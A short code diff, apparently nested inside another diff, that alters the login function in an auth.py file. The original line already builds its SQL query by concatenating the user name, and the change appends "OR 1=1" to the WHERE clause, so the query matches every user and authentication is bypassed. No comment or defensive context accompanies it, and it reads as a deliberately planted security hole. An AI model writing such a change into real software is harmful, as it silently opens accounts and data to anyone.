@@ -1,0 +1,5 @@
+diff --git a/auth.py b/auth.py
+@@ -10,7 +10,7 @@ def login(user, password):
+-    query = "SELECT * FROM users WHERE name='" + user + "'"
++    query = "SELECT * FROM users WHERE name='" + user + "' OR 1=1"
+     return db.execute(query)
